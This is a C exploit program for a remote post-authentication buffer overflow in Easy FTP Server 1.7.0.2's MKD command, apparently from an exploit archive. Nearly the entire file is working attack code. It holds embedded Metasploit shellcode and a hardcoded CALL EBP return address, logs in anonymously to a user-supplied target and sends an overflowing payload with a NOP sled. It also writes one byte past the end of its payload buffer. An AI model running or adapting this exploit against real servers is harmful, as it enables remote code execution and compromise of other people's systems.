#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>

//*************************************************************************
//     Easy~Ftp Server v1.7.0.2 MKD Remote Post-Authentication BoF Exploit
//     ( 11470_x90c.c )
//
//     Date: 24/03/2010
//     Author: x90c < x90c.org >
//
//     Discovered by: loneferret
//
//     Exploits by:
//            [1] 11470.py (PoC) - loneferret ( Found: 13/02/2010 )
//                - http://www.exploit-db.com/exploits/11470
//            [2] 11470_x90c.c ( Exploit )
//                ( MAGIC RET, Metasploit shellcode )
//*************************************************************************


// Metasploit shellcode ( calc.exe ) - 228 Bytes
static char shellcode[] =
{
"\xd9\xcc\x31\xc9\xb1\x33\xd9\x74\x24\xf4\x5b\xba\x99\xe4\x93"
"\x62\x31\x53\x18\x03\x53\x18\x83\xc3\x9d\x06\x66\x9e\x75\x4f"
"\x89\x5f\x85\x30\x03\xba\xb4\x62\x77\xce\xe4\xb2\xf3\x82\x04"
"\x38\x51\x37\x9f\x4c\x7e\x38\x28\xfa\x58\x77\xa9\xca\x64\xdb"
"\x69\x4c\x19\x26\xbd\xae\x20\xe9\xb0\xaf\x65\x14\x3a\xfd\x3e"
"\x52\xe8\x12\x4a\x26\x30\x12\x9c\x2c\x08\x6c\x99\xf3\xfc\xc6"
"\xa0\x23\xac\x5d\xea\xdb\xc7\x3a\xcb\xda\x04\x59\x37\x94\x21"
"\xaa\xc3\x27\xe3\xe2\x2c\x16\xcb\xa9\x12\x96\xc6\xb0\x53\x11"
"\x38\xc7\xaf\x61\xc5\xd0\x6b\x1b\x11\x54\x6e\xbb\xd2\xce\x4a"
"\x3d\x37\x88\x19\x31\xfc\xde\x46\x56\x03\x32\xfd\x62\x88\xb5"
"\xd2\xe2\xca\x91\xf6\xaf\x89\xb8\xaf\x15\x7c\xc4\xb0\xf2\x21"
"\x60\xba\x11\x36\x12\xe1\x7f\xc9\x96\x9f\x39\xc9\xa8\x9f\x69"
"\xa1\x99\x14\xe6\xb6\x25\xff\x42\x48\x6c\xa2\xe3\xc0\x29\x36"
"\xb6\x8d\xc9\xec\xf5\xab\x49\x05\x86\x48\x51\x6c\x83\x15\xd5"
"\x9c\xf9\x06\xb0\xa2\xae\x27\x91\xc0\x31\xbb\x79\x29\xd7\x3b"
"\x1b\x35\x1d"
};

int main(int argc, char *argv[])
{
int sockfd;
struct sockaddr_in sa;
char rbuf[128];
char x0x[278];
int i = 0, j = 0;
int port = 0;
int err = 0;

printf("\n\n***********************************************\n");
printf("*      Easy FTP Server 1.7.0.2 MKD Remote BoF     *\n");
printf("*            Found by: loneferret                 *\n");
printf("*      - http://www.exploit-db.com/exploits/11470 *\n");
printf("*      - 11470_x90c.c - x90c                      *\n");
printf("***************************************************\n\n");

if( argc < 3 )
{
        printf("Usage: %s <Target IP> <Port>\n\n", argv[0]);
        exit(1);
}

port = atoi(argv[2]);

if(port <= 0 || port > 65535)
{
    port = 21;
}

printf("[PORT] %d/tcp\n", port);

memset(&sa, 0, sizeof(sa));
sa.sin_family = AF_INET;
sa.sin_addr.s_addr = inet_addr(argv[1]);
sa.sin_port = htons(port);

if((sockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
{
        err = -1;
        fprintf(stderr, "[!] Socket failed\n");
        goto out;
}

// Socket Connect
if(connect(sockfd, (struct sockaddr *)&sa, sizeof(struct sockaddr)) == -1)
{
        err = -2;
        fprintf(stderr, "[!] Connection failed!\n");
        goto out;
}

printf("[+] Connected!\n");

// Auth
recv(sockfd, rbuf, sizeof(rbuf), 0);

send(sockfd, "USER anonymous\r\n", 16, 0);
recv(sockfd, rbuf, sizeof(rbuf), 0);
if(strstr(rbuf, "okay") != NULL)
        printf("[USER] anonymous\n");

send(sockfd, "PASS anonymous\r\n", 16, 0);
recv(sockfd, rbuf, sizeof(rbuf), 0);
if(strstr(rbuf, "logged in.") != NULL)
        printf("[PASS] anonymous\n");

// Fill Payload
memset(&x0x, 0x90, sizeof(x0x));

for(i = 20, j = 0; j < strlen(shellcode); j++)
    x0x[i++] = shellcode[j];

x0x[0] = 'M';
x0x[1] = 'K';
x0x[2] = 'D';
x0x[3] = ' ';

// MAGIC RET:
// # CALL EBP ( EBP Register points to nopsled of this payload when overflowed )
// # 004041EC   FFD5             |CALL EBP
// #
//
x0x[272] = '\xEC';
x0x[273] = '\x41';
x0x[274] = '\x40';
x0x[275] = '\x00';

x0x[276] = '\r';
x0x[277] = '\n';
x0x[278] = '\x00';

printf("[+] Sending payload...\n");

// Send payload
send(sockfd, x0x, 278, 0);
recv(sockfd, rbuf, sizeof(rbuf), 0);
if((strstr(rbuf, "denied.") != NULL) || (strstr(rbuf, "too long") != NULL))
{
        printf("[!] anonymous account doesn't have permission to MKD command...\n");
        printf("[!] Exploit Failed. ;-x\n");
        goto out;
}

printf("[+] Exploited :-)\n");

out:
        close(sockfd);
        return err;
}
